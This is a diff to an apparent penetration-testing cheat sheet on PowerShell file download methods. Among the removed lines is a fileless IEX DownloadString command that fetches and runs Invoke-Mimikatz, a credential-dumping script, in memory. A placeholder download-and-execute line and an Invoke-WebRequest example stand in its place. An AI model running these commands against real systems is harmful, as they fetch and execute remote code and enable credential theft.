@@ -57,5 +57,10 @@ PS> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Na
 ### PowerShell DownloadString - Fileless Method
 Fileless attacks operate by utilizing certain functions within an operating system to download and execute a payload directly. Instead of saving a PowerShell script to the computer's storage, we execute it straight from the computer's memory using the Invoke-Expression cmdlet or its shorthand alias, IEX as follows:
 ```powershell
-PS> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+PS> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
+```
+
+### PowerShell Invoke-WebRequest
+```powershell
+PS> Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
 ```
